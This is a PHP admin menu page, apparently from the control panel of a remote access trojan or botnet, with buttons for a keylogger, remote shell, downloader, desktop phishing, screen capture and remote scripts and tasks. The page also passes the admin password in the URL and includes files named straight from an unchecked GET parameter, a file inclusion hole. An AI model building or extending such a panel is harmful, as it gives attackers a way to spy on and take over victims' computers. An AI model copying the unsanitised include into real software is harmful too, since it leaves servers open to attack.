<?php
	include("chk.php");
?>
<div class="panel panel-default menupage">
	<div class="panel panel-default" style="overflow-y:scroll;width:100%;height:15%;">

		<center>
			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=keylogger"; ?>"><input class="btn btn-default" value="keylogger" style="width:100%"></a></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=chat"; ?>"><input class="btn btn-default" value="Chat"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=remote shell"; ?>"><input class="btn btn-default" value="Remote Shell"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=downloader"; ?>"><input class="btn btn-default" value="Downloader"   style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=desktop phishing"; ?>"><input class="btn btn-default" value="Desktop Phishing"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=screen"; ?>"><input class="btn btn-default" value="Screen"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=script"; ?>"><input class="btn btn-default" value="Script"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=task"; ?>"><input class="btn btn-default" value="Task"  style="width:100%"></a>

			<a href="<?php echo "admin.php?pass=".$_GET['pass']."&page=Menu&user=".$_GET['user']."&menupage=server"; ?>"><input class="btn btn-default" value="Server"  style="width:100%"></a>
		</center>

	</div>
		<div class="panel panel-default" style="overflow-y:scroll;width:100%;height:100%">
			<?php
				if(isset($_GET['menupage']))
				{
					include("inc/pinc-".$_GET['menupage'].".php");
				}
				else
				{
					echo "<center><img src='data:image/png;base64,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' style='width:200px;margin-top:+100px;'></center>";
				}
			?>
		</div>
</div>
